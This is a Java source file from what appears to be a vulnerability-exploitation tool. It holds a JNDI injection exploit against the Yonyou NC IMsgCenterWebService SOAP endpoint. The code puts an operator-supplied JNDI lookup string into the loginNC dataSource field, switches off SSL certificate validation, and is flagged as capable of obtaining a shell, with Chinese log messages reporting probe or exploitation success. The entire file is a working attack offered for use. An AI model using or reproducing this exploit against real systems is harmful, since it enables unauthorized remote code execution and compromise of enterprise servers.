package com.chave.vuln;

import com.chave.config.Config;
import com.chave.config.Mod;
import com.chave.proxy.HttpProxy;
import com.chave.utils.MyHttpUtil;
import com.chave.utils.SSLUtil;
import javafx.scene.control.TextArea;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class IMsgCenterWebService_JNDI extends VulnBase {
    public static boolean DNSLOG = false;
    public static boolean JNDI = true;
    public static boolean EXEC = false;
    public static boolean UPLOAD = false;
    public static boolean GETSHELL = true;

    public IMsgCenterWebService_JNDI() {
    }

    public IMsgCenterWebService_JNDI(TextArea log, TextArea uploadLog, TextArea execLog) {
        super(log, uploadLog, execLog);
    }

    @Override
    public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
        String vulnerable_url = Config.TARGET + "/uapws/service/nc.itf.msgcenter.IMsgCenterWebService";

        try {
            if (Config.JNDI == null || Config.JNDI.trim() == null) {
                logMessage("[-] 请输入 JNDI 信息.");
                return;
            }
        } catch (NullPointerException e) {
            logMessage("[-] 请输入 JNDI 信息.");
            return;
        }


        try {
            URL url = new URL(vulnerable_url);

            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(conn);

            // 设置请求头
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("SOAPAction", "urn:loginNC");

            String postData =
                    "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ims=\"http://msgcenter.itf.nc/IMsgCenterWebService\">" +
                    "   <soapenv:Header/>" +
                    "   <soapenv:Body>" +
                    "      <ims:loginNC>" +
                    "         <dataSource>" + Config.JNDI + "</dataSource>" +
                    "         <usercode>" + System.currentTimeMillis() + "</usercode>" +
                    "         <password>" + System.currentTimeMillis() + "</password>" +
                    "      </ims:loginNC>" +
                    "   </soapenv:Body>" +
                    "</soapenv:Envelope>";

            MyHttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            int responseCode = MyHttpUtil.getResponseCode(conn);

            if (Config.MOD.equals(Mod.POC) || (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR)) {
                logMessage("[+] IMsgCenterWebService_JNDI 探测成功, 请前往对应 dnslog 平台查看结果.");
                return;
            } else if (Config.MOD.equals(Mod.EXP) || (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR)) {
                logMessage("[+] IMsgCenterWebService_JNDI 漏洞利用成功, 请自行验证.");
                return;
            } else {
                logMessage("[-] IMsgCenterWebService_JNDI 漏洞不存在. 请尝试手动验证.");
            }
        } catch (Exception e) {
            logMessage("[-] IMsgCenterWebService_JNDI 漏洞不存在. 请尝试手动验证.");
        }
    }

}
